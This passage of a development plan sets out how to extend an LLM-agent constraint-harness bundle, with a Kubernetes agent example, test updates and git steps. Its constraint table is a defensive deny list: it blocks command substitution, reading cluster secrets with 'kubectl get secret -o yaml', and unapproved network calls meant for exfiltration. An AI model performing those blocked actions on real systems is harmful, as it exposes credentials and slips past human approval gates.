  README.md                 # Setup + usage instructions
  behavior.yaml             # Amplifier hook wiring
  standalone/
    nano_amplifier_tumor_genome_to_vaccine/
      cli.py                # From runtime/nano/ — with streaming + session
      runtime.py            # From runtime/nano/ — with providers + context
      tools.py              # From runtime/nano/
      gate.py               # From runtime/nano/
      streaming.py          # Nano-specific: progressive response rendering
      session.py            # Nano-specific: resume multi-day research
      context.py            # Nano-specific: load @mention references
      providers.py          # Nano-specific: switch between Claude/GPT
      constraints.py        # Copy of generated constraints
      config.yaml           # Copy of config
      system-prompt.md      # Copy of system prompt
    pyproject.toml          # Stamped from runtime/nano/pyproject.toml.template
    setup.sh                # Stamped from runtime/nano/setup.sh.template
```
```

### Step 3: Create `context/examples/micro-k8s-platform-engineer.md`

```markdown
# Example: Micro K8s Platform Engineer
**Tier:** Micro — Near-full Amplifier with modes, recipes, delegation, and approval gates.
**Scale:** Single — Multiple constraints, one environment (Kubernetes cluster management).
**Walkthrough:** Mission → Capabilities → Key features, annotated with WHY micro tier.

---

## THE MISSION

A platform engineering team wants an AI agent that manages Kubernetes clusters:
deploy applications, monitor health, troubleshoot issues, and run security audits.
This requires multiple behavioral modes (work vs. review vs. plan), sub-agent delegation
(parallel security scans across namespaces), and approval gates (before any destructive
operation like scaling down or deleting resources).

## CAPABILITY-ADVISOR OUTPUT

**Recommended tier:** Micro
- Needs modes: work mode (deploy, apply), review mode (read-only audit), plan mode (architecture)
- Needs delegation: spawn focused sub-agents for parallel namespace scans
- Needs approval gates: human confirmation before destructive operations (delete pod, scale down)
- Needs recipes: deployment pipeline (build → test → stage → approve → prod)
- Needs session persistence: audit trail across sessions

**Recommended tools:**
- [x] bash — kubectl, helm, kustomize, stern (log tailing)
- [x] web_fetch — query vulnerability databases (CVE, NVD)
- [x] read_file / write_file — manifests, helm values, kustomize overlays
- [x] grep / glob — search across manifests and configs
- [x] delegate — spawn sub-agents for parallel security scans
- [x] todo — track multi-step deployment progress

### Constraints (9)

| # | Constraint | Rationale |
|---|-----------|-----------|
| 1 | **Sandbox boundary** — file ops inside project directory | Protect host filesystem |
| 2 | **kubectl context lock** — only operate on approved cluster contexts | Prevent accidental operations on production clusters |
| 3 | **No direct production deploy** — block `kubectl apply` to prod namespace without approval | Require human confirmation for production changes |
| 4 | **Bash allowlist** — kubectl, helm, kustomize, stern, jq, yq, grep, cat | Prevent arbitrary command execution |
| 5 | **No command substitution** — block `$()`, backticks | Prevent bypassing kubectl restrictions |
| 6 | **No delete without approval** — block `kubectl delete` unless approval gate passes | Prevent accidental resource deletion |
| 7 | **Network whitelist** — web_fetch only to approved vulnerability databases | Block data exfiltration |
| 8 | **No secret access** — block `kubectl get secret -o yaml` | Prevent credential exposure |
| 9 | **Audit logging** — every kubectl command logged with timestamp and user | Compliance trail |

### Mode Definitions

```yaml
modes:
  work:
    description: "Active operations — deploy, apply, scale, troubleshoot"
    allowed_tools: [bash, read_file, write_file, edit_file, grep, glob, delegate, todo]
    prompt_overlay: "You are in WORK mode. You may make changes to the cluster."
  review:
    description: "Read-only audit — security scan, health check, cost analysis"
    allowed_tools: [bash, read_file, grep, glob, web_fetch, delegate]
    prompt_overlay: "You are in REVIEW mode. Read-only. Do NOT apply changes."
  plan:
    description: "Architecture planning — design, document, propose changes"
    allowed_tools: [read_file, grep, glob, web_fetch]
    prompt_overlay: "You are in PLAN mode. Analyze and plan. Minimal tool use."
```

### Recipe Example: Deployment Pipeline

```yaml
name: deploy-to-staging
steps:
  - name: validate-manifests
    agent: "Validate all Kubernetes manifests in deploy/"
  - name: run-tests
    bash: "kubectl apply --dry-run=server -f deploy/"
  - name: deploy-staging
    agent: "Apply manifests to staging namespace"
  - name: health-check
    agent: "Verify all pods are running and healthy in staging"
    while_condition: "not ready"
  - name: approve-production
    approval: true
    agent: "Review staging deployment and recommend production readiness"
  - name: deploy-production
    agent: "Apply manifests to production namespace"
```

> **Why micro tier?**
> The combination of modes (work/review/plan), delegation (parallel scans),
> approval gates (before destructive ops), and recipes (deployment pipeline)
> requires the micro tier. Nano doesn't have any of these features. This is
> a production system that needs the full capability set.
```

### Step 4: Update `context/examples/enterprise-governance-harness.md`

Add a tier reference at the top. Find:

```
# Example: Enterprise Governance Harness
**Scale:** Complex (factory) — NemoClaw-style multi-layer constraints with governance and audit.
```

Replace with:

```
# Example: Enterprise Governance Harness
**Tier:** Micro (factory-scale) — NemoClaw-style multi-layer constraints with governance and audit.
**Scale:** Complex (factory) — Generates one governance harness per department from shared templates.
```

### Step 5: Verify all example files exist (should be 4 after rename + 2 new)

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
ls -la context/examples/
python -c "
import os
examples = os.listdir('context/examples')
examples = [f for f in examples if os.path.isfile(os.path.join('context/examples', f))]
print(f'Example files: {sorted(examples)}')
assert len(examples) == 6, f'Expected 6 examples, found {len(examples)}'
for expected in ['pico-filesystem-sandbox.md', 'nano-tumor-genome-to-vaccine.md',
                 'micro-k8s-platform-engineer.md', 'enterprise-governance-harness.md']:
    assert expected in examples, f'Missing: {expected}'
print('PASS: all 6 example files present')
"
```

Expected: "PASS: all 6 example files present"

### Step 6: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add context/examples/
git commit -m "feat: add tier-specific reference examples including tumor-genome-to-vaccine

- Rename nano-filesystem-harness.md → pico-filesystem-sandbox.md (it's a pico-tier example)
- NEW: nano-tumor-genome-to-vaccine.md — the cancer dog story as a full walkthrough:
  mission → name → capability-advisor output → spec → system prompt → artifact structure.
  Shows streaming + session persistence for long research sessions.
- NEW: micro-k8s-platform-engineer.md — Kubernetes cluster management with modes
  (work/review/plan), delegation (parallel security scans), approval gates (before
  destructive ops), and recipes (deployment pipeline). Shows why micro tier is needed.
- Update enterprise-governance-harness.md with tier reference (micro/factory-scale)
- Now 6 example files: 2 existing (pico-filesystem, enterprise-governance) +
  2 domain examples (developer-tooling, domain-library) + 2 new tier examples"
```

---

## Task 10: Bundle Updates + Tests + Push

**What you're building:** The final integration — updating bundle.md and behaviors/harness-machine.yaml to register the 2 new agents, updating tests/test_scaffold.py to verify the new 9-agent structure, and running the full test suite.

**Files to MODIFY:**
- `bundle.md`
- `behaviors/harness-machine.yaml`
- `tests/test_scaffold.py`

### Step 1: Update `bundle.md` frontmatter

The bundle currently registers 7 agents. Add the 2 new agents and update the description.

Find in `bundle.md`:
```yaml
  description: |
    Interactive and autonomous constraint harness generation for LLM agents.
    Based on the AutoHarness paper (Lou et al., Google DeepMind, 2026).
    Provides 7 agents, 7 modes, 4 recipes, and 3 skills for generating
    constraint harnesses from nano-amplifiers to enterprise governance systems.
```

Replace with:
```yaml
  description: |
    Mini-amplifier factory — generates self-contained AI agents at three size
    tiers (pico/nano/micro) with 80% of Amplifier's capabilities at 20% of the size.
    Based on the AutoHarness paper (Lou et al., Google DeepMind, 2026).
    Provides 9 agents, 7 modes, 4 recipes, and 3 skills. Includes dynamic capability
    discovery, mission-based naming, and three runtime scaffolds.
```

Find:
```yaml
agents:
  include:
    - harness-machine:environment-analyst
    - harness-machine:spec-writer
    - harness-machine:plan-writer
    - harness-machine:harness-generator
    - harness-machine:harness-critic
    - harness-machine:harness-refiner
    - harness-machine:harness-evaluator
```

Replace with:
```yaml
agents:
  include:
    - harness-machine:environment-analyst
    - harness-machine:mission-architect
    - harness-machine:capability-advisor
    - harness-machine:spec-writer
    - harness-machine:plan-writer
    - harness-machine:harness-generator
    - harness-machine:harness-critic
    - harness-machine:harness-refiner
    - harness-machine:harness-evaluator
```

Also update the body text. Find:
```
This bundle provides seven modes that guide you through constraint harness generation:
```

Replace with:
```
This bundle is a mini-amplifier factory — describe your mission, and it generates a self-contained
AI agent at pico (800-1,500 lines), nano (2,000-3,500 lines), or micro (5,000-8,000 lines) tier.

It provides seven modes that guide you through mini-amplifier generation:
```

Update the Available Agents table in the body. Find:
```
## Available Agents

| Agent | Purpose |
|-------|---------| 
| `harness-machine:environment-analyst` | Explores target environment, maps action space, assesses feasibility |
| `harness-machine:spec-writer` | Produces harness specification from exploration results |
| `harness-machine:plan-writer` | Creates implementation plan (single harness or factory) |
| `harness-machine:harness-generator` | Generates constraint code and nano-amplifier artifacts |
| `harness-machine:harness-critic` | Reviews harness for coverage gaps and over-constraints |
| `harness-machine:harness-refiner` | Improves harness from critic feedback |
| `harness-machine:harness-evaluator` | Independent measurement of legal action rate and reward |
```

Replace with:
```
## Available Agents

| Agent | Purpose |
|-------|---------|
| `harness-machine:environment-analyst` | Explores target environment, maps action space, runs dynamic capability discovery |
| `harness-machine:mission-architect` | Creates meaningful name, domain-specific system prompt, README, context docs |
| `harness-machine:capability-advisor` | Recommends tier, tools, provider; produces pre-checked capability picker |
| `harness-machine:spec-writer` | Produces tier-aware harness specification from exploration results |
| `harness-machine:plan-writer` | Creates tier-aware implementation plan (simple/medium/complex) |
| `harness-machine:harness-generator` | Generates constraint code and mini-amplifier artifacts per tier |
| `harness-machine:harness-critic` | Reviews harness for coverage gaps, CLI issues, system prompt accuracy |
| `harness-machine:harness-refiner` | Improves harness from critic feedback (tier-aware) |
| `harness-machine:harness-evaluator` | Independent measurement: legal action rate, CLI verification, tool functionality |
```

### Step 2: Update `behaviors/harness-machine.yaml`

Add the 2 new agents and update the description. Find:
```yaml
  description: |
    Mounts the modes system and registers agents for harness generation workflows.
    Provides 7 modes, 7 agents, and 3 skills for constraint harness development.
```

Replace with:
```yaml
  description: |
    Mounts the modes system and registers agents for mini-amplifier factory workflows.
    Provides 7 modes, 9 agents, and 3 skills for tier-aware mini-amplifier generation.
```

Find:
```yaml
agents:
  include:
    - harness-machine:environment-analyst
    - harness-machine:spec-writer
    - harness-machine:plan-writer
    - harness-machine:harness-generator
    - harness-machine:harness-critic
    - harness-machine:harness-refiner
    - harness-machine:harness-evaluator
```

Replace with:
```yaml
agents:
  include:
    - harness-machine:environment-analyst
    - harness-machine:mission-architect
    - harness-machine:capability-advisor
    - harness-machine:spec-writer
    - harness-machine:plan-writer
    - harness-machine:harness-generator
    - harness-machine:harness-critic
    - harness-machine:harness-refiner
    - harness-machine:harness-evaluator
```

### Step 3: Update `tests/test_scaffold.py`

Several test classes need updates for the new 9-agent structure, new context file, and new example count.

**Change 1:** Update the `TestBundleMd` class. Find:

```python
    def test_agents_include_has_seven_entries(self):
        fm = _parse_frontmatter(_read_file("bundle.md"))
        agents = fm["agents"]["include"]
        assert len(agents) == 7
```

Replace with:

```python
    def test_agents_include_has_nine_entries(self):
        fm = _parse_frontmatter(_read_file("bundle.md"))
        agents = fm["agents"]["include"]
        assert len(agents) == 9
```

**Change 2:** Update `test_agents_include_contains_all_seven_agents`. Find:

```python
    def test_agents_include_contains_all_seven_agents(self):
        fm = _parse_frontmatter(_read_file("bundle.md"))
        agents_str = str(fm["agents"]["include"])
        for name in [
            "environment-analyst",
            "spec-writer",
            "plan-writer",
            "harness-generator",
            "harness-critic",
            "harness-refiner",
            "harness-evaluator",
        ]:
            assert name in agents_str, f"Agent {name!r} not found in agents.include"
```

Replace with:

```python
    def test_agents_include_contains_all_nine_agents(self):
        fm = _parse_frontmatter(_read_file("bundle.md"))
        agents_str = str(fm["agents"]["include"])
        for name in [
            "environment-analyst",
            "mission-architect",
            "capability-advisor",
            "spec-writer",
            "plan-writer",
            "harness-generator",
            "harness-critic",
            "harness-refiner",
            "harness-evaluator",
        ]:
            assert name in agents_str, f"Agent {name!r} not found in agents.include"
```

**Change 3:** Update the behavior YAML test. Find:

```python
    def test_agents_include_has_seven_entries(self):
        data = yaml.safe_load(_read_file("behaviors/harness-machine.yaml"))
        agents = data["agents"]["include"]
        assert len(agents) == 7
```

Replace with:

```python
    def test_agents_include_has_nine_entries(self):
        data = yaml.safe_load(_read_file("behaviors/harness-machine.yaml"))
        agents = data["agents"]["include"]
        assert len(agents) == 9
```

**Change 4:** Update the `ALL_AGENTS` list. Find:

```python
ALL_AGENTS = [
    "environment-analyst",
    "spec-writer",
    "plan-writer",
    "harness-generator",
    "harness-critic",
    "harness-refiner",
    "harness-evaluator",
]
```

Replace with:

```python
ALL_AGENTS = [
    "environment-analyst",
    "mission-architect",
    "capability-advisor",
    "spec-writer",
    "plan-writer",
    "harness-generator",
    "harness-critic",
    "harness-refiner",
    "harness-evaluator",
]
```

**Change 5:** Update the context files list to include the new constraint-spec-template. Find:

```python
CONTEXT_FILES = [
    "instructions.md",
    "philosophy.md",
    "pattern.md",
    "harness-format.md",
    "templates-reference.md",
]
```

Replace with:

```python
CONTEXT_FILES = [
    "instructions.md",
    "philosophy.md",
    "pattern.md",
    "harness-format.md",
    "templates-reference.md",
    "constraint-spec-template.md",
]
```

**Change 6:** Update the example count. Find:

```python
    def test_four_example_files_exist(self):
        examples_dir = os.path.join(BUNDLE_ROOT, "context", "examples")
        examples = [
            f for f in os.listdir(examples_dir) if os.path.isfile(os.path.join(examples_dir, f))
        ]
        assert len(examples) == 4, (
            f"Expected 4 example files in context/examples/, found {len(examples)}: {examples}"
        )
```

Replace with:

```python
    def test_six_example_files_exist(self):
        examples_dir = os.path.join(BUNDLE_ROOT, "context", "examples")
        examples = [
            f for f in os.listdir(examples_dir) if os.path.isfile(os.path.join(examples_dir, f))
        ]
        assert len(examples) == 6, (
            f"Expected 6 example files in context/examples/, found {len(examples)}: {examples}"
        )

    def test_tier_specific_examples_exist(self):
        examples_dir = os.path.join(BUNDLE_ROOT, "context", "examples")
        for expected in [
            "pico-filesystem-sandbox.md",
            "nano-tumor-genome-to-vaccine.md",
            "micro-k8s-platform-engineer.md",
        ]:
            path = os.path.join(examples_dir, expected)
            assert os.path.isfile(path), f"context/examples/{expected} does not exist"
```

**Change 7:** Update the `TestRuntime` class (lines 515-573) to check for the three-tier structure. Find the entire `class TestRuntime:` block and replace with:

```python
class TestRuntime:
    def test_runtime_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime"))

    def test_pico_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "pico"))

    def test_nano_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "nano"))

    def test_micro_dir_exists(self):
        assert os.path.isdir(os.path.join(BUNDLE_ROOT, "runtime", "micro"))

    def test_pico_cli_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "cli.py")
        assert os.path.isfile(path)

    def test_pico_runtime_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "runtime.py")
        assert os.path.isfile(path)

    def test_pico_tools_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "tools.py")
        assert os.path.isfile(path)

    def test_pico_has_rich_rendering(self):
        content = _read_file("runtime/pico/cli.py")
        assert "rich" in content

    def test_pico_has_constraint_gate(self):
        content = _read_file("runtime/pico/runtime.py")
        assert "gate" in content.lower() or "constraint" in content.lower()

    def test_pico_pyproject_template_has_harness_name(self):
        content = _read_file("runtime/pico/pyproject.toml.template")
        assert "{{harness_name}}" in content

    def test_pico_dockerfile_template_exists(self):
        path = os.path.join(BUNDLE_ROOT, "runtime", "pico", "Dockerfile.template")
        assert os.path.isfile(path)

    def test_pico_docker_compose_has_project_root(self):
        content = _read_file("runtime/pico/docker-compose.template.yaml")
        assert "{{project_root}}" in content
```

### Step 4: Run the full test suite

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_scaffold.py -v
```

Expected: ALL PASS (after Phase A scaffolds are in place). The key changes:
- `test_agents_include_has_nine_entries` — passes because bundle.md now has 9
- `test_agents_include_contains_all_nine_agents` — passes because both new agents are listed
- `test_six_example_files_exist` — passes because we have 6 examples now
- `test_tier_specific_examples_exist` — passes because all 3 tier examples exist
- All `TestRuntime` tests — passes because runtime/pico/, nano/, micro/ exist
- All agent frontmatter tests — passes because all 9 agents have valid frontmatter

If the pico/nano/micro scaffolds aren't built yet (Phase A not completed), the `TestRuntime` tests will fail — that's expected. The agent, mode, context, and example tests should all pass.

### Step 5: Run the per-scaffold tests too (if Phase A is complete)

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_pico_scaffold.py tests/test_nano_scaffold.py tests/test_micro_scaffold.py -v 2>&1 | tail -20
```

Expected: ALL PASS (if Phase A completed first).

### Step 6: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add bundle.md behaviors/harness-machine.yaml tests/test_scaffold.py
git commit -m "feat: update bundle for 9 agents, three-tier scaffolds, and expanded tests

- bundle.md: updated to 9 agents (add mission-architect, capability-advisor),
  description now mentions mini-amplifier factory and three size tiers,
  agent table updated with new agent descriptions
- behaviors/harness-machine.yaml: register 9 agents (was 7),
  description updated for mini-amplifier factory
- tests/test_scaffold.py: updated for 9-agent structure:
  * TestBundleMd: 9 agents in bundle.md frontmatter
  * TestBehaviorYaml: 9 agents in harness-machine.yaml
  * TestAgents: ALL_AGENTS list now has 9 entries
  * TestContextFiles: added constraint-spec-template.md to CONTEXT_FILES
  * TestContextFiles: 6 examples (was 4), tier-specific example existence checks
  * TestRuntime: updated for three-tier structure (pico/nano/micro dirs)"
```

### Step 7: Push everything to GitHub

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git push origin main
```

---

## Summary: What You've Built (Full Plan)

After all 10 tasks across 3 phases, the harness-machine bundle is transformed from a constraint generator into a mini-amplifier factory:

### Phase A (Tasks 1-3): Runtime Scaffolds
```
runtime/
├── pico/     # 9 files, ~800-1,200 lines
├── nano/     # 13 files, ~2,000-3,500 lines
└── micro/    # 18 files, ~5,000-8,000 lines
```

### Phase B (Tasks 4-7): Agents + Context
```
agents/
├── mission-architect.md     # NEW — naming + documentation
├── capability-advisor.md    # NEW — dynamic picker
├── environment-analyst.md   # UPDATED — dynamic discovery + open questions
├── spec-writer.md           # UPDATED — tier-aware spec
├── plan-writer.md           # UPDATED — tier-aware plans
├── harness-generator.md     # UPDATED — tier-aware generation
├── harness-critic.md        # UPDATED — expanded review
├── harness-refiner.md       # UPDATED — tier-aware refinement
└── harness-evaluator.md     # UPDATED — CLI verification

context/
└── constraint-spec-template.md  # NEW — 8 categories of bash attack vectors
```

### Phase C (Tasks 8-10): Modes + Examples + Integration
```
modes/
├── harness-explore.md   # UPDATED — dynamic discovery + 3 agent delegations
├── harness-spec.md      # UPDATED — Phase 0 (tier + name + capabilities)
├── harness-plan.md      # UPDATED — tier-aware plan shapes
├── harness-execute.md   # UPDATED — tier in generator delegation
├── harness-verify.md    # UPDATED — CLI verification protocol
├── harness-finish.md    # UPDATED — tier-aware scaffold copying
└── harness-debug.md     # UPDATED — tier-specific debugging

context/
├── instructions.md      # UPDATED — tiers, discovery, naming
├── harness-format.md    # UPDATED — tier table
├── pattern.md           # UPDATED — three-tier architecture
└── examples/
    ├── pico-filesystem-sandbox.md           # RENAMED from nano-filesystem-harness.md
    ├── nano-tumor-genome-to-vaccine.md      # NEW — the cancer dog story
    ├── micro-k8s-platform-engineer.md       # NEW — k8s with modes/recipes/delegation
    ├── enterprise-governance-harness.md     # UPDATED — tier reference
    ├── developer-tooling-harness.md         # unchanged
    └── domain-library-harness.md            # unchanged

bundle.md                          # UPDATED — 9 agents, factory description
behaviors/harness-machine.yaml     # UPDATED — 9 agents registered
tests/test_scaffold.py             # UPDATED — 9-agent checks, 6 examples, 3-tier runtime
```

**Total test coverage:** ~135 structural scaffold tests (Phase A) + ~220 bundle structure tests (Phase C) = ~355 tests.

**Total agents:** 9 (was 7)
**Total modes:** 7 (same, enhanced)
**Total examples:** 6 (was 4)
**Total context files:** 6 (was 5)
